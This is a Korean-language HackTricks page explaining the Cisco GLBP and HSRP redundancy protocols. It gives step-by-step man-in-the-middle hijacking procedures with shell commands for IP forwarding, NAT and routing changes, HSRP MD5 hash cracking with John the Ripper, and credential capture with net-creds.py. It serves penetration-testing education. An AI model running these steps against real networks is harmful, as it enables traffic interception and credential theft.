# GLBP & HSRP 공격

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>를 통해 AWS 해킹을 처음부터 전문가까지 배워보세요<strong>!</strong></summary>

HackTricks를 지원하는 다른 방법:

* **회사를 HackTricks에서 광고하거나 HackTricks를 PDF로 다운로드**하려면 [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)를 확인하세요!
* [**공식 PEASS & HackTricks 스웨그**](https://peass.creator-spring.com)를 얻으세요.
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요. 독점적인 [**NFTs**](https://opensea.io/collection/the-peass-family) 컬렉션입니다.
* 💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **참여**하거나 **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**를** **팔로우**하세요.
* **Hacking 트릭을 공유하려면** [**HackTricks**](https://github.com/carlospolop/hacktricks) 및 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 저장소에 PR을 제출하세요.

</details>


## FHRP Hijacking 개요

### FHRP에 대한 통찰력
FHRP는 여러 라우터를 단일 가상 유닛으로 병합하여 네트워크의 견고성을 제공하기 위해 설계되었습니다. Cisco Systems은 GLBP 및 HSRP와 같은 중요한 프로토콜을 이 스위트에 도입했습니다.

### GLBP 프로토콜 통찰력
Cisco의 창조물인 GLBP는 TCP/IP 스택에서 작동하며, 통신에는 UDP 포트 3222를 사용합니다. GLBP 그룹의 라우터는 3초 간격으로 "hello" 패킷을 교환합니다. 라우터가 이러한 패킷을 10초 동안 보내지 않으면 오프라인으로 간주됩니다. 그러나 이러한 타이머는 고정되어 있지 않으며 수정할 수 있습니다.

### GLBP 작동 및 부하 분산
GLBP는 단일 가상 IP와 여러 개의 가상 MAC 주소를 사용하여 라우터 간에 부하를 분산하는 기능으로 두드러집니다. GLBP 그룹에서 모든 라우터가 패킷 전달에 참여합니다. HSRP/VRRP와 달리 GLBP는 다음과 같은 여러 메커니즘을 통해 실제로 부하를 분산합니다.

- **호스트 종속 부하 분산:** 호스트에 일관된 AVF MAC 주소 할당을 유지하여 안정적인 NAT 구성에 필수적입니다.
- **라운드 로빈 부하 분산:** 기본 접근 방식으로, 요청하는 호스트 사이에서 AVF MAC 주소 할당을 번갈아가며 수행합니다.
- **가중치 기반 라운드 로빈 부하 분산:** 미리 정의된 "가중치" 메트릭을 기반으로 부하를 분산합니다.

### GLBP의 주요 구성 요소 및 용어
- **AVG (Active Virtual Gateway):** MAC 주소를 피어 라우터에 할당하는 주요 라우터입니다.
- **AVF (Active Virtual Forwarder):** 네트워크 트래픽을 관리하는 라우터입니다.
- **GLBP 우선 순위:** AVG를 결정하는 메트릭으로, 기본값은 100이며 1에서 255 사이의 범위를 가집니다.
- **GLBP 가중치:** 라우터의 현재 부하를 반영하며, 수동으로 또는 객체 추적을 통해 조정할 수 있습니다.
- **GLBP 가상 IP 주소:** 모든 연결된 장치에 대한 네트워크의 기본 게이트웨이로 사용됩니다.

GLBP는 상호 작용을 위해 예약된 멀티캐스트 주소 224.0.0.102와 UDP 포트 3222를 사용합니다. 라우터는 3초 간격으로 "hello" 패킷을 전송하며, 패킷이 10초 동안 누락되면 비운영 상태로 간주됩니다.

### GLBP 공격 메커니즘
공격자는 우선 순위 값이 가장 높은 (255) GLBP 패킷을 보내어 주 라우터가 될 수 있습니다. 이로 인해 DoS 또는 MITM 공격이 발생하여 트래픽 가로채기 또는 리디렉션이 가능해집니다.

### Loki를 사용한 GLBP 공격 실행
[Loki](https://github.com/raizo62/loki_on_kali)는 우선 순위와 가중치가 255로 설정된 패킷을 주입하여 GLBP 공격을 수행할 수 있습니다. 공격 전 단계에서는 Wireshark와 같은 도구를 사용하여 가상 IP 주소, 인증 존재 여부 및 라우터 우선 순위 값을 포함한 정보를 수집해야 합니다.

공격 단계:
1. Promiscuous 모드로 전환하고 IP 포워딩을 활성화합니다.
2. 대상 라우터를 식별하고 해당 IP를 검색합니다.
3. 임의의 ARP를 생성합니다.
4. AVG를 가장한 악성 GLBP 패킷을 주입합니다.
5. 공격자의 네트워크 인터페이스에 GLBP 가상 IP와 동일한 보조 IP 주소를 할당합니다.
6. 완전한 트래픽 가시성을 위해 SNAT를 구현합니다.
7. 원래 AVG 라우터를 통해 계속된 인터넷 액세스를 보장하기 위해 라우팅을 조정합니다.

이러한 단계를 따라 공격자는 네트워크 트래픽을 가로채고 분석할 수 있는 "중간자"로 자리 잡을 수 있으며, 이는 암호화되지 않거나 민감한 데이터를 포함한 네트워크 트래픽을 가로챌 수 있습니다.

데모를 위해 필요한 명령어 일부는 다음과 같습니다:
```bash
# Enable promiscuous mode and IP forwarding
sudo ip link set eth0 promisc on
sudo sysctl -w net.ipv4.ip_forward=1

# Configure secondary IP and SNAT
sudo ifconfig eth0:1 10.10.100.254 netmask 255.255.255.0
sudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE

# Adjust routing
sudo route del default
sudo route add -net 0.0.0.0 netmask 0.0.0.0 gw 10.10.100.100
```
트래픽 모니터링 및 가로채기는 net-creds.py 또는 유사한 도구를 사용하여 침해된 네트워크를 통해 흐르는 데이터를 캡처하고 분석하는 것으로 수행될 수 있습니다.

### HSRP 하이재킹에 대한 수동 설명과 명령어 세부 정보

#### HSRP(Hot Standby Router/Redundancy Protocol) 개요
HSRP는 Cisco의 프로프라이어터리 프로토콜로, 네트워크 게이트웨이의 장애 조치를 위해 설계되었습니다. 이 프로토콜은 여러 물리적 라우터를 공유 IP 주소를 가진 단일 논리적 유닛으로 구성할 수 있게 해줍니다. 이 논리적 유닛은 트래픽을 관리하는 주 라우터에 의해 관리됩니다. GLBP와 달리 HSRP는 로드 밸런싱을 위해 우선순위와 가중치와 같은 메트릭을 사용하지 않고, 단일 활성 라우터에 의존합니다.

#### HSRP에서의 역할과 용어
- **HSRP 활성 라우터**: 트래픽 흐름을 관리하는 게이트웨이로 작동하는 장치입니다.
- **HSRP 대기 라우터**: 활성 라우터가 실패할 경우 대체할 준비가 된 백업 라우터입니다.
- **HSRP 그룹**: 단일 견고한 가상 라우터를 형성하기 위해 협력하는 라우터의 집합입니다.
- **HSRP MAC 주소**: HSRP 설정에서 논리적 라우터에 할당된 가상 MAC 주소입니다.
- **HSRP 가상 IP 주소**: HSRP 그룹의 가상 IP 주소로, 연결된 장치들의 기본 게이트웨이로 작동합니다.

#### HSRP 버전
HSRP는 HSRPv1과 HSRPv2 두 가지 버전으로 제공되며, 주로 그룹 용량, 멀티캐스트 IP 사용 및 가상 MAC 주소 구조의 차이가 있습니다. 이 프로토콜은 서비스 정보 교환을 위해 특정 멀티캐스트 IP 주소를 활용하며, 3초마다 Hello 패킷을 전송합니다. 10초 간격으로 패킷을 수신하지 못하면 라우터는 비활성으로 간주됩니다.

#### HSRP 공격 메커니즘
HSRP 공격은 최대 우선순위 값을 주입하여 활성 라우터의 역할을 강제로 인계하는 것을 포함합니다. 이로 인해 Man-In-The-Middle (MITM) 공격이 발생할 수 있습니다. 공격 전 필수 단계로는 HSRP 설정에 대한 데이터 수집이 포함되며, 이는 Wireshark를 사용하여 트래픽 분석을 통해 수행할 수 있습니다.

#### HSRP 인증 우회를 위한 단계
1. HSRP 데이터를 포함하는 네트워크 트래픽을 .pcap 파일로 저장합니다.
```shell
tcpdump -w hsrp_traffic.pcap
```
2. hsrp2john.py를 사용하여 .pcap 파일에서 MD5 해시를 추출합니다.
```shell
python2 hsrp2john.py hsrp_traffic.pcap > hsrp_hashes
```
3. John the Ripper를 사용하여 MD5 해시를 크랙합니다.
```shell
john --wordlist=mywordlist.txt hsrp_hashes
```

**Loki를 사용한 HSRP 인젝션 실행**

1. HSRP 광고를 식별하기 위해 Loki를 실행합니다.
2. 네트워크 인터페이스를 promiscuous 모드로 설정하고 IP 포워딩을 활성화합니다.
```shell
sudo ip link set eth0 promisc on
sudo sysctl -w net.ipv4.ip_forward=1
```
3. Loki를 사용하여 특정 라우터를 대상으로 설정하고 크랙된 HSRP 암호를 입력하며 활성 라우터를 위장하는 필요한 구성을 수행합니다.
4. 활성 라우터 역할을 얻은 후, 네트워크 인터페이스와 IP 테이블을 구성하여 합법적인 트래픽을 가로챕니다.
```shell
sudo ifconfig eth0:1 10.10.100.254 netmask 255.255.255.0
sudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
```
5. 라우팅 테이블을 수정하여 트래픽을 이전의 활성 라우터를 통해 라우팅합니다.
```shell
sudo route del default
sudo route add -net 0.0.0.0 netmask 0.0.0.0 gw 10.10.100.100
```
6. net-creds.py 또는 유사한 유틸리티를 사용하여 가로채힌 트래픽에서 자격 증명을 캡처합니다.
```shell
sudo python2 net-creds.py -i eth0
```

이러한 단계를 실행하면 공격자는 GLBP 하이재킹과 유사한 방식으로 트래픽을 가로채고 조작할 수 있는 위치에 있게 됩니다. 이는 HSRP와 같은 중복성 프로토콜의 취약성을 강조하며, 견고한 보안 조치의 필요성을 보여줍니다.


## 참고 자료
- [https://medium.com/@in9uz/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9](https://medium.com/@in9uz/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9)


<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>를 통해 제로에서 영웅까지 AWS 해킹 배우기<strong>!</strong></summary>

HackTricks를 지원하는 다른 방법:

* HackTricks에서 **회사 광고를 보거나 HackTricks를 PDF로 다운로드**하려면 [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)를 확인하세요!
* [**공식 PEASS & HackTricks 스웨그**](https://peass.creator-spring.com)를 구매하세요.
* 독점적인 [**NFT**](https://opensea.io/collection/the-peass-family) 컬렉션인 [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요.
* 💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **참여**하거나 **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**를** 팔로우하세요.
* **HackTricks**와 **HackTricks Cloud** github 저장소에 PR을 제출하여 **자신의 해킹 기법을 공유**하세요.

</details>
